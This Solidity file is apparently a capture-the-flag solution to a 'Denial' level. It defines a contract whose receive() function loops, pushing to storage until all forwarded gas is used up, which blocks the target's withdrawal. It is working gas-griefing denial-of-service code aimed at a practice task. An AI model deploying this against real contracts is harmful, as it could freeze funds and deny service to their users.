// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Task.sol';

contract DenialSolution {

    uint256[] list;
   
    constructor() {}

    receive() external payable {
        for (uint256 i = 0; i < type(uint256).max; i++ ) {
            list.push(i);
        }
    }

}